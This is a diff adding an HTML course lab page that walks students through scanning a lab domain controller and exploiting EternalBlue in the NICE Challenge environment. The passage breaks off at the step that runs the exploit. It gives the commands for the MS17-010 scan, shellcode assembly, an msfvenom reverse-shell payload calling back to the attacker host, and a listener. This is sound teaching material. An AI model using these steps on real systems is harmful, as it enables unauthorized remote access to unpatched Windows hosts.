@@ -1,0 +1,812 @@
+<!-- LAB HEADER / TOC -->
+<p id="#lab9drk"></p>
+<table border="0" style="border-collapse: collapse; width: 99%; border-style: none; height: 300px;">
+  <tbody>
+    <tr style="height: 102px;">
+      <td colspan="2" style="width: 100%; text-align: center; vertical-align: top;"><img src="https://courses.ccac.edu/bbcswebdav/pid-11603983-dt-content-rid-48750046_1/xid-48750046_1" style="border: 0px solid #000000;" width="311" height="100" alt="ccac-logo"/></td>
+    </tr>
+    <tr style="height: 30px;">
+      <td colspan="2" style="width: 100%; text-align: center; vertical-align: top;"><span style="font-size: 24pt;"><strong>LAB 9: NICE Challenge - Dr. Kisow Special</strong></span></td>
+    </tr>
+    
+    <tr style="height: 22.5px;">
+      <td style="width: 72%; height: 22.50px;"><span style="color: #ba372a; font-size: 12pt;"><strong>INSTRUCTIONS</strong></span></td>
+      <td rowspan="6" style="width: 28%; height: 175px;  vertical-align: top;">
+        <table border="0" style="border-collapse: collapse; width: 350px; background-color: #ecf0f1; border-style: none; float: right; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+          <tbody>
+            <tr>
+              <td style="width: 100%; height: 20px;"><strong><span style="font-family: arial, helvetica, sans-serif;">Table of Contents:</span></strong></td>
+            </tr>
+            <tr>
+              <td style="width: 100%; height: 20px;"><span style="font-family: arial, helvetica, sans-serif; color: #ba372a;">&nbsp; &nbsp; &raquo; <a href="##scan" style="color: #ba372a;">Part 1 - Scanning</a></span></td>
+            </tr>
+            <tr>
+              <td style="width: 100%; height: 20px;"><span style="font-family: arial, helvetica, sans-serif; color: #ba372a;">&nbsp; &nbsp; &raquo; <a href="##exploit" style="color: #ba372a;">Part 2 - Exploit</a></span></td>
+            </tr>
+            <tr>
+              <td style="width: 100%; height: 20px;"><span style="font-family: arial, helvetica, sans-serif; color: #ba372a;">&nbsp; &nbsp; &raquo; <a href="##postexploit" style="color: #ba372a;">Part 3 - Post-Exploit</a></span></td>
+            </tr>
+            <tr>
+              <td style="width: 100%; height: 20px;"><span style="font-family: arial, helvetica, sans-serif; color: #ba372a;">&nbsp; &nbsp; &raquo; <a href="##passthehash" style="color: #ba372a;">Part 3 - Pass-the-Hash</a></span></td>
+            </tr>
+          </tbody>
+        </table>
+      </td>
+    </tr>
+    <tr>
+      <td style="width: 72%; vertical-align: top; height: 75px; text-align: justify;"><span style="font-size: 12pt;">This lab will teach students how to identify and exploit the EternalBlue vulnerability in a Windows Active Directory environment. Students will gain hands-on experience in vulnerability identification, exploitation, lateral movement, and advanced post-exploitation techniques, including passing the hash. The lab leverages the NICE Challenge "Pretty Safe Electronics: Unauthorized Activity Alert" environment to simulate a realistic enterprise network scenario.<br/><br/>Students will begin by identifying and exploiting the EternalBlue vulnerability to gain initial access. Once inside the network, they will explore methods of lateral movement to traverse the Active Directory environment, leveraging compromised credentials to escalate access to critical systems. The lab culminates in an exploration of the "passing the hash" technique, allowing students to understand how attackers utilize captured hashes to move laterally without needing plaintext passwords.<br/><br/>By the end of the lab, students will not only exploit vulnerabilities but also analyze and document findings comprehensively, offering recommendations for remediation and securing network environments against similar attacks.<br /></span><br /><p style="font-family: arial, helvetica, sans-serif; color: #ba372a; font-size: 12pt; text-align: center; margin: 0; padding: 0;"><strong><em>Upload your answers to this lab.</em></strong></p></td>
+    </tr>
+    <tr>
+      <td style="width: 72%; height: 22.50px; vertical-align: top;"><span style="font-size: 12pt; color: #ba372a;"><strong>OBJECTIVE</strong></span></td>
+    </tr>
+    <tr>
+      <td style="width: 72%; vertical-align: top; height: 75px; text-align: justify;"><span style="font-size: 12pt;">The primary objective of this lab is to empower students with the skills and knowledge required to conduct ethical and responsible penetration testing activities. By utilizing an isolated network virtual machine and Metasploitable2, students will delve into the fascinating realm of network exploration, gaining insights into potential vulnerabilities within the lab environment.</span></td>
+    </tr>
+    <tr>
+      <td style="width: 72%; vertical-align: top; height: 75px; text-align: justify;">
+        <p><span style="font-size: 12pt;">Begin by logging into the NICE Challenge Portal; then follow the instructions below.</span></p>
+        <blockquote>
+          <p style="margin: 0; padding: 0;"><span style="font-size: 12pt;">&emsp;<strong>Environment</strong>: Pretty Safe Electronics (Protect and Defend)</span></p>
+          <p style="margin: 0; padding: 0;"><span style="font-size: 12pt;">&emsp;<strong>Challenge Title</strong>: Unauthorized Activity Alert</span></p>
+          <p style="margin: 0; padding: 0;"><span style="font-size: 12pt;">&emsp;<strong>Access</strong>: Begin by logging into the <a href="https://portal.nice-challenge.com/" target="_blank" rel="noopener"><span style="color: #ba372a;"><strong>NICE Challenge</strong></span></a> portal.</span></p>
+        </blockquote>
+      </td>
+    </tr>
+  </tbody>
+</table>
+
+<!-- VERSION/REVISION -->
+<p style="text-align: center; margin: 0; padding: 0; color: #ced4d9">VERSION 1</p>
+<p style="text-align: center; margin: 0; padding: 0; color: #ced4d9">REVISED 17-NOV-2024</p>
+<p id="#top9"></p>
+
+
+<!-- NOTE BLUE -->
+<blockquote>
+  <table border="0" style="border-collapse: collapse; width: 75%; background-color: #c2e0f4; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+    <tbody>
+      <tr>
+        <td style="width: 2%; background-color: #236fa1;">&nbsp;</td>
+        <td colspan="2" style="width: 98%; text-align: left; vertical-align: top;">
+          <p style="margin: 0; padding: 0;"><img src="https://courses.ccac.edu/bbcswebdav/xid-48837980_1"  width="22" height="22" style="border: 0px solid #000000;" alt="note"/><strong><span style="font-family: arial, helvetica, sans-serif; color: #236fa1; font-size: 14pt;">NOTE</span></strong></p>
+        </td>
+      </tr>
+      <tr>
+        <td style="width: 2%; background-color: #236fa1;">&nbsp;</td>
+        <td style="width: 5%; text-align: right; vertical-align: top;"><strong><span style="font-family: arial, helvetica, sans-serif; color: #236fa1; font-size: 12pt;">&#x25CF;</span></strong></td>
+        <td style="width: 93%;">
+          <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #236fa1; font-size: 12pt;">In this lab, you're going to use the NICE Challenge ecosystem and its virtual machines, but Dr. Kisow has gone completely off the rails and wrote a new assignment using the "Pretty Safe Electronics (Protect and Defend)" ecosystem. Ignore the NICE Challenge self-tests and ignore the NICE submission system - You will submit this assignment through BlackBoard.</span></p>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</blockquote>
+
+<!-- PART 1 -->
+<hr />
+<p id="#scan"><span style="font-family: arial, helvetica, sans-serif; font-size: 14pt; color: #ba372a;"><strong>Part 1 - Scanning</strong></span></p>
+
+<!-- 1.1 -->
+<ol start="1">
+  <li>
+    <span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Log in to the <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>Security-Desk</strong></span> system. It's Kali Linux, just an older release than what you have installed on your own computer.</span>
+  </li>
+</ol>
+
+<!-- 1.2 -->
+<ol start="2">
+  <li>
+    <span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Do a nmap scan of the <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>Domain-Controller</strong></span> from within <strong>Metasploit</strong>. Instruct nmap to include <strong>all</strong> the details and tests in its scanning.</span>
+    <p></p>
+
+    <!-- 1.2 DELIVERABLE -->
+    <table border="0" style="border-collapse: collapse; width: 85%; background-color: #ced4d9; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+      <tbody>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="5" style="width: 98%; text-align: left; vertical-align: top;">
+            <p style="margin: 0; padding: 0;"><img src="https://courses.ccac.edu/bbcswebdav/xid-48856563_1"  style="border: 0px solid #000000;" height="24" width="24" alt="deliverable"/><strong><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;">DELIVERABLE</span></strong></p>
+          </td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td style="width: 5%; text-align: right; vertical-align: top;"><strong><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">1.2</span></strong></td>
+          <td colspan="3" style="width: 93%;"></td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="2" style="width: 7%; text-align: right; vertical-align: top;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;"><strong>A.</strong></span></td>
+          <td colspan="2" style="width: 91%;">
+            <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">What nmap command do you use to scan the domain controller?</span></p>
+          </td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="2" style="width: 7%; text-align: right; vertical-align: top;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;"><strong>B.</strong></span></td>
+          <td colspan="2" style="width: 91%;">
+            <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">From the <strong>hosts</strong> view of Metasploit, submit the hostname of the domain controller.</span></p>
+          </td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="2" style="width: 7%; text-align: right; vertical-align: top;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;"><strong>C.</strong></span></td>
+          <td colspan="2" style="width: 91%;">
+            <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">From the <strong>services</strong> view of Metasploit, submit the version and protocol of SSH that is running on the domain controller.</span></p>
+          </td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="2" style="width: 7%; text-align: right; vertical-align: top;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;"><strong>D.</strong></span></td>
+          <td colspan="2" style="width: 91%;">
+            <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">From the <strong>services</strong> view of Metasploit, submit the version and release number of Windows that is running on the domain controller.</span></p>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+    <p></p>
+</li>
+</ol>
+
+<!-- PART 2 -->
+<a href="##top9" style="color: #ba372a;">[TOP]</a>
+<hr />
+<p id="#exploit"><span style="font-family: arial, helvetica, sans-serif; font-size: 14pt; color: #ba372a;"><strong>Part 2 - Exploit</strong></span></p>
+
+<!-- 2.1 -->
+<ol start="1">
+  <li>
+    <span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Search for exploits related to the eternalblue exploit, which is effective on many (unpatched) versions of Windows.</span>
+
+    <!-- CODE -->
+    <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+      <tbody>
+        <tr style="background-color: #ced4e9;">
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">⬤</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">⬤</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">⬤</span></td>
+          <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+        </tr>
+        <tr>
+          <td colspan="4" style="width: 99%;">
+            <p style="margin: 0; padding: 0;">
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Metasploit Search<br /></span></strong>
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">search eternalblue</span></span></strong>
+            </p>
+        </td>
+        </tr>
+      </tbody>
+    </table>
+    <p></p>
+  </li>
+</ol>
+
+<!-- 2.2 -->
+<ol start="2">
+  <li>
+    <span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Metasploit has a scanner for eternalblue. Let's use that first.</span>
+
+    <!-- CODE -->
+    <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+      <tbody>
+        <tr style="background-color: #ced4e9;">
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">⬤</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">⬤</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">⬤</span></td>
+          <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+        </tr>
+        <tr>
+          <td colspan="4" style="width: 99%;">
+            <p style="margin: 0; padding: 0;">
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Metasploit Scan<br /></span></strong>
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">use auxiliary/scanner/smb/smb_ms17_010</span></span></strong><br/>
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">info</span></span></strong><br/>
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">options</span></span></strong><br/>
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">set RHOSTS 172.16.30.55</span></span></strong><br/>
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">exploit</span></span></strong><br/>
+            </p>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+    <p></p>
+  </li>
+</ol>
+
+<!-- 2.3 -->
+<ol start="3">
+  <li>
+    <span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">A vulnerability was found! Let's use the eternalblue exploit.</span>
+  </li>
+</ol>
+
+<!-- 2.4 -->
+<ol start="4">
+  <li>
+    <span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Download the <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>eternalblue8_exploit.py</strong></span> from <a href="https://gist.github.com/worawit" target="_blank" rel="noopener"><span style="color: #ba372a;">https://gist.github.com/worawit</span></a> (Use the FireFox web browser on the <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>Security-Desk</strong></span> workstation).</span>
+  </li>
+</ol>
+
+<!-- 2.5 -->
+<ol start="5">
+  <li>
+    <span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Download the eternalblue kernel shellcode <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>eternalblue_x64_kshellcode.asm</strong></span> from <a href="https://gist.github.com/worawit/05105fce9e126ac9c85325f0b05d6501#file-eternalblue_x64_kshellcode-asm" target="_blank" rel="noopener"><span style="color: #ba372a;">https://gist.github.com/worawit/05105fce9e126ac9c85325f0b05d6501#file-eternalblue_x64_kshellcode-asm</span></a> (Use the FireFox web browser on the <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>Security-Desk</strong></span> workstation).</span>
+  </li>
+</ol>
+
+<!-- 2.6 -->
+<ol start="6">
+  <li>
+    <span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Search for exploits related to the eternalblue exploit, which is effective on many (unpatched) versions of Windows.</span>
+
+    <!-- CODE -->
+    <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+      <tbody>
+        <tr style="background-color: #ced4e9;">
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">⬤</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">⬤</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">⬤</span></td>
+          <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+        </tr>
+        <tr>
+          <td colspan="4" style="width: 99%;">
+            <p style="margin: 0; padding: 0;">
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Assemble Shellcode<br /></span></strong>
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;$ nasm <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">-f bin eternalblue_x64_kshellcode.asm</span></span></strong>
+            </p>
+        </td>
+        </tr>
+      </tbody>
+    </table>
+    <p></p>
+  </li>
+</ol>
+
+<!-- 2.7 -->
+<ol start="7">
+  <li>
+    <span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Generate a userland shell payload using <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>msfvenom</strong></span>. Note that <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>LHOST</strong></span> and <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>LPORT</strong></span> point to the Security-Desk machine. It's the "local" machine from the perspective of the exploit.</span>
+
+    <!-- CODE -->
+    <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+      <tbody>
+        <tr style="background-color: #ced4e9;">
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">⬤</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">⬤</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">⬤</span></td>
+          <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+        </tr>
+        <tr>
+          <td colspan="4" style="width: 99%;">
+            <p style="margin: 0; padding: 0;">
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Generate Userland Payload<br /></span></strong>
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;$ msfvenom <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">-p windows/x64/shell/reverse_tcp -f raw -o shell_msf.bin EXITFUNC=thread LHOST=172.16.20.55 LPORT=4444</span></span></strong>
+            </p>
+        </td>
+        </tr>
+      </tbody>
+    </table>
+    <p></p>
+  </li>
+</ol>
+
+<!-- 2.8 -->
+<ol start="8">
+  <li>
+    <span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Combine the kernel and userland shellcode.</span>
+
+    <!-- CODE -->
+    <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+      <tbody>
+        <tr style="background-color: #ced4e9;">
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">⬤</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">⬤</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">⬤</span></td>
+          <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+        </tr>
+        <tr>
+          <td colspan="4" style="width: 99%;">
+            <p style="margin: 0; padding: 0;">
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Combine Kernel and Userland Shellcoded<br /></span></strong>
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;$ cat <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">eternalblue_x64_kshellcode shell_msf.bin > reverse_shell.bin</span></span></strong>
+            </p>
+        </td>
+        </tr>
+      </tbody>
+    </table>
+    <p></p>
+  </li>
+</ol>
+
+<!-- 2.9 -->
+<ol start="9">
+  <li>
+    <span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Set up Metasploit to receive the meterpreter shell as soon as it is running.</span>
+
+    <!-- CODE -->
+    <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+      <tbody>
+        <tr style="background-color: #ced4e9;">
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">⬤</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">⬤</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">⬤</span></td>
+          <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+        </tr>
+        <tr>
+          <td colspan="4" style="width: 99%;">
+            <p style="margin: 0; padding: 0;">
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Metasploit Scan</span></strong><br />
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">use exploit/multi/handler</span></span></strong><br/>
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">set PAYLOAD windows/x64/shell/reverse_tcp</span></span></strong><br/>
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">set LHOST 172.16.20.55 <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;"><strong># IP of Security-Desk, which will listen.</strong></span></span></span></strong><br/>
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">set LPORT 4444</span></span></strong><br/>
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">exploit -j <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;"><strong># Run exploit handler as a background job.</strong></span></span></span></strong><br/>
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;### Leave this running and waiting...</span></strong>
+            </p>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+    <p></p>
+  </li>
+</ol>
+
+<!-- 2.10 -->
+<ol start="10">
+  <li>
+    <span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">In a <strong>new</strong> shell window, install the Impacket utility that the exploit needs to function.</span>
+
+    <!-- CODE -->
+    <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+      <tbody>
+        <tr style="background-color: #ced4e9;">
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">⬤</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">⬤</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">⬤</span></td>
+          <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+        </tr>
+        <tr>
+          <td colspan="4" style="width: 99%;">
+            <p style="margin: 0; padding: 0;">
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# We need to install Impacket utility on Python 2.7; however pip is not installed for that Python version, because the system pip is for Python 3.x.</span></strong><br />
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;$ cd <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">~/Downloads</span></span></strong><br />
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;$ curl <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">'https://raw.githubusercontent.com/pypa/get-pip/20.3.4/get-pip.py' -o get-pip.py</span></span></strong><br />
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;$ sudo <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">python2 get-pip.py</span></span></strong><br />
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;$ sudo <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">python2 -m pip --version <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;"><strong># VERSION SHOULD BE 20.3.4.</strong></span></span></span></strong><br />
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;$ sudo <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">python2 -m pip install impacket==0.9.22</span></span></strong><br />
+            </p>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+    <p></p>
+  </li>
+</ol>
+
+<!-- 2.11 -->
+<ol start="11">
+  <li>
+    <span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Run the exploit.</span>
+
+    <!-- CODE -->
+    <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+      <tbody>
+        <tr style="background-color: #ced4e9;">
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">⬤</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">⬤</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">⬤</span></td>
+          <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+        </tr>
+        <tr>
+          <td colspan="4" style="width: 99%;">
+            <p style="margin: 0; padding: 0;">
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Run Exploit</span></strong><br />
